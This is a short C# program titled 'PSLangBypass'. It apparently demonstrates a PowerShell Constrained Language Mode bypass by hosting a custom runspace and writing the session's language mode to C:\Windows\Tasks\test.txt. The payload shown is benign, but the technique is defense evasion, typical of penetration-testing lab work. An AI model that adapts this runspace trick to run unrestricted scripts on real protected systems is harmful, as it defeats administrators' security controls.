using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation.Runspaces;
using System.Management.Automation;

namespace PSLangBypass
{
    class LangBypass
    {
        static void Main(string[] args)
        {
            // Creating the runspace and opening it
            Runspace rs = RunspaceFactory.CreateRunspace();
            // Creating powershell object
            PowerShell ps = PowerShell.Create();

            rs.Open();
            
            // Getting the LanguageMode of current session and saving to a file
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Windows\\Tasks\\test.txt";

            // Initialising the runspace
            ps.Runspace = rs;

            // Running the command above
            ps.AddScript(cmd);
            ps.Invoke();

            // Closing runspace 
            rs.Close();
        }
    }
}
